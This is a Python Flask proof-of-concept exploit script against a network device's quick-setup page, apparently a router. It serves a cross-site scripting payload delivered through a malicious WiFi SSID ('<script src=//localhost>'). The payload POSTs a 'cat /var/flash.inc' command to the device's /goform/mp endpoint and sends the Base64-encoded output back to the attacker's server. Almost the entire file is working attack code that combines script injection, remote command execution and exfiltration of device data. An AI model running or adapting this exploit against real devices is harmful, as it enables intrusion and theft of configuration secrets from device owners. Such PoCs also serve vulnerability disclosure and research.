from flask import Flask
import logging
import sys
from flask import request
import base64

app = Flask(__name__)

# Disable logging
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

# XSS payload which executes a command and sends the output
# back to the remote server encoded as Base64.
xss_payload = """
window.onload = function() {
	fetch("/goform/mp", {
        "body": "command=cat /var/flash.inc&getID=",
        "method": "POST",
    }).then(response => response.text()).then(data => {
        fetch("//localhost/response?data=" + btoa(data))
    });
}
"""

print("")
print("[+] PoC fetch device information via XSS and RCE")
print("[+] Create a hotspot with the following SSID: <script src=//localhost>")
print("[+] Visit the quick setup site on the device and refresh the WiFi list")
print("")

# When the XSS is invoked and the browser loads the script return the payload.
@app.route("/")
def get_xss():
    print("[*] Sending XSS payload..")
    return xss_payload

# When receiving the command output decode and display it.
@app.route("/response")
def get_data():
    data = request.args.get("data").replace(" ", "+")
    # Not the best decoding, but works for a PoC
    decoded_data = base64.b64decode(data).decode().split("</font><br>")[1].split("<br>\n\n</body>")[0].replace("&nbsp;", " ").replace("<br>", "")
    print(decoded_data)
    return ""

app.run("0.0.0.0", port=80)